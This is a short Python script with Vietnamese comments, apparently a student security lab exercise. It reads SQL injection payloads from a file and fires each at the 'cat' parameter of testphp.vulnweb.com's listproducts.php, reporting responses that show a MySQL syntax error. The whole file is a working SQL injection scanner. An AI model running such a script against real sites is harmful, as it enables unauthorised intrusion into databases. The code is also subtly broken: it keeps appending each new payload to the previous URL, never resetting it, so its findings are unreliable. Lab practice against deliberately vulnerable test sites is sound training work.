# Module request để gủi các yêu cầu HTTP sử dụng để gửi yêu cầu tới http://testphp.vulnweb.com
import requests
# Khởi tạo một mảng rỗng mysql_attacks
mysql_attacks = []
# Mở file MySQL.txt
with open('DangTuanAnh_AT180305_TH2/MySQL.txt', 'r') as fileHandle:
    # Đọc từng dòng trong file và đẩy vào trong mảng mysql_attacks
    for line in fileHandle:
        attack = line.strip()
        mysql_attacks.append(attack)
# Khai báo url và gán giá trị là trang web để thực hiện tấn công
url = "http://testphp.vulnweb.com/listproducts.php?cat="
#Sử dụng vòng lặp để thực hiện từng trường hợp trong mảng mysql_attacks
for attack in mysql_attacks:
    # Gán giá trị vào biến url và attack
    url = url + attack
    # In ra màn hình url đang thực hiện
    print("Checking... " + url)
    # Gửi yêu câu tới url đang thực hiện và gán giá trị trả về là response
    response = requests.get(url)
    # Nếu giá trị trả về là 200 thì là thành công
    if response.status_code == 200:
        if "error in your SQL syntax" in response.text:
            # In ra màn hình url tấn công thành công
            print("Potential SQL Injection vulnerability found: " + url)
        else:
            # In ra màn hình url tấn công thất bại
            print("No obvious vulnerability detected for: " + url)




        